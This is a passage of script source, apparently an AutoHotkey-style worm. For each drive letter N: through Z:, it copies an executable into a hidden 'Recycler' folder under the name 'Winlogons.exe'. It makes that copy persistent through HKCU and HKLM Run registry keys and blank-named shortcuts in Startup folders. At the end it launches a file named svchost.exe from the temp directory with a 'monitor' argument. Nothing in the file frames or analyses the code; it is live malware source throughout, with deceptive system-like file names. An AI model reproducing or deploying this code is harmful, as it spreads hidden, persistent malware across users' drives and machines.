Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,N:\Recycler\Winlogons.exe
If ErrorLevel
goto reg58
goto restrt
reg58:
filecreateshortcut,"N:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg59
goto restrt
reg59:
filecreateshortcut,"N:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg60
goto restrt
reg60:
filecreateshortcut,"N:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

OINS:
ifnotexist,O:\Recycler
{
filecreatedir,O:\Recycler
if errorlevel
goto PINS
FILESETATTRIB,+SH,O:\Recycler
}
ELSE
{
}
Ifexist,O:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,O:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,O:\Recycler\Winlogons.exe
If ErrorLevel
goto reg61
goto restrt
reg61:
Filecreateshortcut,"O:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg62
goto restrt
reg62:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,O:\Recycler\Winlogons.exe
If ErrorLevel
goto reg63
reg63:
goto restrt
filecreateshortcut,"O:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg64
goto restrt
reg64:
filecreateshortcut,"O:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg65
goto restrt
reg65:
filecreateshortcut,"O:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

PINS:
ifnotexist,P:\Recycler
{
filecreatedir,P:\Recycler
if errorlevel
goto QINS
FILESETATTRIB,+SH,P:\Recycler
}
ELSE
{
}
Ifexist,P:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,P:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,P:\Recycler\Winlogons.exe
If ErrorLevel
goto reg66
goto restrt
reg66:
Filecreateshortcut,"P:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg67
goto restrt
reg67:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,P:\Recycler\Winlogons.exe
If ErrorLevel
goto reg68
goto restrt
reg68:
filecreateshortcut,"P:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg69
goto restrt
reg69:
filecreateshortcut,"P:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg70
goto restrt
reg70:
filecreateshortcut,"P:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

QINS:
ifnotexist,Q:\Recycler
{
filecreatedir,Q:\Recycler
if errorlevel
goto RINS
FILESETATTRIB,+SH,Q:\Recycler
}
ELSE
{
}
Ifexist,Q:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,Q:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,Q:\Recycler\Winlogons.exe
If ErrorLevel
goto reg71
goto restrt
reg71:
Filecreateshortcut,"Q:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg72
goto restrt
reg72:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,Q:\Recycler\Winlogons.exe
If ErrorLevel
goto reg73
goto restrt
reg73:
filecreateshortcut,"Q:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg74
goto restrt
reg74:
filecreateshortcut,"Q:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg75
goto restrt
reg75:
filecreateshortcut,"Q:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

RINS:
ifnotexist,R:\Recycler
{
filecreatedir,R:\Recycler
if errorlevel
goto SINS
FILESETATTRIB,+SH,R:\Recycler
}
ELSE
{
}
Ifexist,R:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,R:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,R:\Recycler\Winlogons.exe
If ErrorLevel
goto reg76
goto restrt
reg76:
Filecreateshortcut,"R:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg77
goto restrt
reg77:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,R:\Recycler\Winlogons.exe
If ErrorLevel
goto reg78
goto restrt
reg78:
filecreateshortcut,"R:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg79
goto restrt
reg79:
filecreateshortcut,"R:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg80
goto restrt
reg80:
filecreateshortcut,"R:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

SINS:
ifnotexist,S:\Recycler
{
filecreatedir,S:\Recycler
if errorlevel
goto TINS
FILESETATTRIB,+SH,S:\Recycler
}
ELSE
{
}
Ifexist,S:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,S:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,S:\Recycler\Winlogons.exe
If ErrorLevel
goto reg81
goto restrt
reg81:
Filecreateshortcut,"S:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg82
goto restrt
reg82:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,S:\Recycler\Winlogons.exe
If ErrorLevel
goto reg83
goto restrt
reg83:
filecreateshortcut,"S:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg84
goto restrt
reg84:
filecreateshortcut,"S:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg85
goto restrt
reg85:
filecreateshortcut,"S:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

TINS:
ifnotexist,T:\Recycler
{
filecreatedir,T:\Recycler
if errorlevel
goto UINS
FILESETATTRIB,+SH,T:\Recycler
}
ELSE
{
}
Ifexist,T:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,T:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,T:\Recycler\Winlogons.exe
If ErrorLevel
goto reg86
goto restrt
reg86:
Filecreateshortcut,"T:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg87
goto restrt
reg87:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,T:\Recycler\Winlogons.exe
If ErrorLevel
goto reg88
goto restrt
reg88:
filecreateshortcut,"T:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg89
goto restrt
reg89:
filecreateshortcut,"T:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg90
goto restrt
reg90:
filecreateshortcut,"T:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

UINS:
ifnotexist,U:\Recycler
{
filecreatedir,U:\Recycler
if errorlevel
goto VINS
FILESETATTRIB,+SH,U:\Recycler
}
ELSE
{
}
Ifexist,U:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,U:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,U:\Recycler\Winlogons.exe
If ErrorLevel
goto reg91
goto restrt
reg91:
Filecreateshortcut,"U:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg92
goto restrt
reg92:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,U:\Recycler\Winlogons.exe
If ErrorLevel
goto reg93
goto restrt
reg93:
filecreateshortcut,"U:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg94
goto restrt
reg94:
filecreateshortcut,"U:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg95
goto restrt
reg95:
filecreateshortcut,"U:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

VINS:
ifnotexist,V:\Recycler
{
filecreatedir,V:\Recycler
if errorlevel
goto WINS
FILESETATTRIB,+SH,V:\Recycler
}
ELSE
{
}
Ifexist,V:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,V:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,V:\Recycler\Winlogons.exe
If ErrorLevel
goto reg96
goto restrt
reg96:
Filecreateshortcut,"V:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg97
goto restrt
reg97:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,V:\Recycler\Winlogons.exe
If ErrorLevel
goto reg98
goto restrt
reg98:
filecreateshortcut,"V:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg99
goto restrt
reg99:
filecreateshortcut,"V:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg100
goto restrt
reg100:
filecreateshortcut,"V:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

WINS:
ifnotexist,W:\Recycler
{
filecreatedir,W:\Recycler
if errorlevel
goto XINS
FILESETATTRIB,+SH,W:\Recycler
}
ELSE
{
}
Ifexist,W:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,W:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,W:\Recycler\Winlogons.exe
If ErrorLevel
goto reg101
goto restrt
reg101:
Filecreateshortcut,"W:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg102
goto restrt
reg102:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,W:\Recycler\Winlogons.exe
If ErrorLevel
goto reg103
goto restrt
reg103:
filecreateshortcut,"W:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg104
goto restrt
reg104:
filecreateshortcut,"W:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg105
goto restrt
reg105:
filecreateshortcut,"W:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

XINS:
ifnotexist,X:\Recycler
{
filecreatedir,X:\Recycler
if errorlevel
goto YINS
FILESETATTRIB,+SH,X:\Recycler
}
ELSE
{
}
Ifexist,X:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,X:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,X:\Recycler\Winlogons.exe
If ErrorLevel
goto reg106
goto restrt
reg106:
Filecreateshortcut,"X:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg107
goto restrt
reg107:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,X:\Recycler\Winlogons.exe
If ErrorLevel
goto reg108
goto restrt
reg108:
filecreateshortcut,"X:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg109
goto restrt
reg109:
filecreateshortcut,"X:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg110
goto restrt
reg110:
filecreateshortcut,"X:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

YINS:
ifnotexist,Y:\Recycler
{
filecreatedir,Y:\Recycler
if errorlevel
goto ZINS
FILESETATTRIB,+SH,Y:\Recycler
}
ELSE
{
}
Ifexist,Y:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,Y:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,Y:\Recycler\Winlogons.exe
If ErrorLevel
goto reg111
goto restrt
reg111:
Filecreateshortcut,"Y:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg112
goto restrt
reg112:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,Y:\Recycler\Winlogons.exe
If ErrorLevel
goto reg113
goto restrt
reg113:
filecreateshortcut,"Y:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg114
goto restrt
reg114:
filecreateshortcut,"Y:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg115
goto restrt
reg115:
filecreateshortcut,"Y:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

ZINS:
ifnotexist,Z:\Recycler
filecreatedir,Z:\Recycler
FILESETATTRIB,+SH,Z:\Recycler
Ifexist,Z:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,Z:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,Z:\Recycler\Winlogons.exe
If ErrorLevel
goto reg116
goto restrt
reg116:
Filecreateshortcut,"Z:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg117
goto restrt
reg117:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,Z:\Recycler\Winlogons.exe
If ErrorLevel
goto reg118
goto restrt
reg118:
filecreateshortcut,"Z:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg119
goto restrt
reg119:
filecreateshortcut,"Z:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg120
goto restrt
reg120:
filecreateshortcut,"Z:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
restrt:
Run %temp%\MsData\svchost.exe %temp%\MsData\monitor
Exitapp
